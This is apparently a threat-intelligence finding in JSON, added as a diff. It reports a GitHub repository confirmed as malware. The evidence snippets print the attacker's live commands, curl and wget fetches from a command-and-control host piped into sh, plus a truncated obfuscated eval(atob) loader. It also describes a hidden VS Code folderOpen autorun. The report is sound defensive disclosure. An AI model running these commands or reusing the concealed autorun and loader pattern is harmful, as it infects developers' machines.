@@ -1,0 +1,89 @@
+{
+  "finding": {
+    "key": "repository:agrawalchirag/corex",
+    "kind": "repository",
+    "id": "agrawalchirag/corex",
+    "url": "https://github.com/agrawalchirag/CoreX",
+    "registry": "github",
+    "owner": "agrawalchirag",
+    "status": "confirmed",
+    "confidence": "auto",
+    "score": 13,
+    "detection_method": "signature_match",
+    "attribution": "",
+    "campaign_id": "",
+    "rules": "install_hook/vscode-autorun; obfuscation/eval-decoded; obfuscation/atob",
+    "evidence_locations": ".vscode/tasks.json:0; postcss.config.js:6",
+    "c2_hosts": "vscode-helper171.vercel.app",
+    "iocs": "vscode-helper171.vercel.app; https://vscode-helper171.vercel.app/settings/mac?flag=4; https://vscode-helper171.vercel.app/settings/linux?flag=4; https://vscode-helper171.vercel.app/settings/windows; curl 'https://vscode-helper171.vercel.app/settings/mac?flag=4' | sh; .vscode/tasks.json",
+    "matched_signatures": "folderOpen curl filename:tasks.json",
+    "reasons": "Shares a confirmed-malware code signature ['folderOpen curl filename:tasks.json'] | Tier-2 confirmed (bash score 13)",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20260923T001603Z",
+    "last_seen": "hunt-20260923T001603Z",
+    "evidence_file": "repositories/agrawalchirag_corex.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": ".vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl 'https://vscode-helper171.vercel.app/settings/mac?flag=4' | sh wget -qO- 'https://vscode-helper171.vercel.app/settings/linux?flag=4' | sh curl https://vscode-helper171.vercel.app/settings/windows"
+    },
+    {
+      "file": "postcss.config.js",
+      "line": 6,
+      "category": "obfuscation",
+      "rule": "eval-decoded",
+      "snippet": "decoded payload -> second-stage decode | };eval(atob('Z2xvYmFsWychJ109JzExJzt2YXIgXyRfMWU0Mj0oZnVuY3Rpb24obCxlKXt2YXIgaD1sLmxlbmd0aDt2YXIgZz1bXTtmb3IodmFyIGo9MDtqPCBoO2orKyl7Z1tqXT0gbC5jaGFyQXQoail9O2"
+    },
+    {
+      "file": ".vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl 'https://vscode-helper171.vercel.app/settings/mac?flag=4' | sh wget -qO- 'https://vscode-helper171.vercel.app/settings/linux?flag=4' | sh curl https://vscode-helper171.vercel.app/settings/windows"
+    },
+    {
+      "file": "postcss.config.js",
+      "line": 6,
+      "category": "obfuscation",
+      "rule": "eval-decoded",
+      "snippet": "decoded payload -> second-stage decode | };eval(atob('Z2xvYmFsWychJ109JzExJzt2YXIgXyRfMWU0Mj0oZnVuY3Rpb24obCxlKXt2YXIgaD1sLmxlbmd0aDt2YXIgZz1bXTtmb3IodmFyIGo9MDtqPCBoO2orKyl7Z1tqXT0gbC5jaGFyQXQoail9O2"
+    },
+    {
+      "file": "postcss.config.js",
+      "line": 6,
+      "category": "obfuscation",
+      "rule": "atob",
+      "snippet": "};eval(atob('Z2xvYmFsWychJ109JzExJzt2YXIgXyRfMWU0Mj0oZnVuY3Rpb24obCxlKXt2YXIgaD1sLmxlbmd0aDt2YXIgZz1bXTtmb3IodmFyIGo9MDtqPCBoO2orKyl7Z1tqXT0gbC5jaGFyQXQoail9O2Zvcih2YXIgaj0wO2o8-67-1IGg7aisrKXt2YXIgcz"
+    }
+  ],
+  "commit_sha": "437614a8b223180db5caea8636dd4ad81406ace0",
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/agrawalchirag/corex",
+    "version_info": "all",
+    "threat_description": "Git Warden confirmed this repository as malicious by static analysis of its source code. The code was read, never executed. The malicious code sits in the file .vscode/tasks.json. The code runs automatically from a Visual Studio Code task configured to trigger on folderOpen. Nothing has to be installed, built, or clicked. Opening the project folder in the editor is enough to run the attacker's command. The task fetches a remote script and pipes it straight into a shell, with a separate payload selected for macOS, Linux and Windows. It also carries a presentation block that sets reveal to never and echo to false and closes the panel afterwards, which hides the terminal so the victim never sees the command run. Suppressing output next to a fetch and pipe has no legitimate use and shows the intent is concealment. No legitimate project ships code like this. The repository was either compromised or purpose-built to deliver malware to anyone who clones or installs it. The evidence references link the exact file and line of each finding, and the payload description names every detection rule that fired, so a reviewer can open the repository and verify each one independently. Git Warden found this repository by searching GitHub for code that matches a confirmed malware signature: folderOpen curl filename:tasks.json. The delivery method, a .vscode/tasks.json task that automatically runs a remote shell command the moment the repository is opened in VS Code, matches the DPRK-attributed 'Contagious Interview' campaign, in which fake recruiters lure developers into opening a coding-task repository that silently executes a first-stage downloader. The payload is fetched from attacker-controlled infrastructure: vscode-helper171.vercel.app. Attribution: the tradecraft is consistent with North Korea, but a single signal is a lead rather than an attribution, so we do not attribute it on this evidence alone. The evidence behind this is: (1) Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun, obfuscated-eval-atob-loader, dprk-dropper-path-shape.",
+    "payload_description": "The malicious payload sits in .vscode/tasks.json. The code runs automatically from a Visual Studio Code task configured to trigger on folderOpen. Nothing has to be installed, built, or clicked. Opening the project folder in the editor is enough to run the attacker's command. The task fetches a remote script and pipes it straight into a shell, with a separate payload selected for macOS, Linux and Windows. It also carries a presentation block that sets reveal to never and echo to false and closes the panel afterwards, which hides the terminal so the victim never sees the command run. Suppressing output next to a fetch and pipe has no legitimate use and shows the intent is concealment. Detection rules that fired in this repository: install_hook/vscode-autorun (1 file), obfuscation/atob (1 file), obfuscation/eval-decoded (1 file).",
+    "publisher": "agrawalchirag",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "dprk-consistent-tradecraft",
+      "vscode-folderopen-autorun",
+      "obfuscated-eval-atob-loader",
+      "dropper"
+    ],
+    "evidence_references": "https://github.com/agrawalchirag/corex/blob/437614a8b223180db5caea8636dd4ad81406ace0/.vscode/tasks.json\nhttps://github.com/agrawalchirag/corex/blob/437614a8b223180db5caea8636dd4ad81406ace0/postcss.config.js#L6",
+    "verified_iocs": "vscode-helper171.vercel.app\nhttps://vscode-helper171.vercel.app/settings/mac?flag=4\nhttps://vscode-helper171.vercel.app/settings/linux?flag=4\nhttps://vscode-helper171.vercel.app/settings/windows\ncurl 'https://vscode-helper171.vercel.app/settings/mac?flag=4' | sh\n.vscode/tasks.json",
+    "contributors": [],
+    "first_seen": "2026-09-23T00:16:03Z",
+    "last_seen": "2026-09-23T00:16:03Z"
+  }
+}
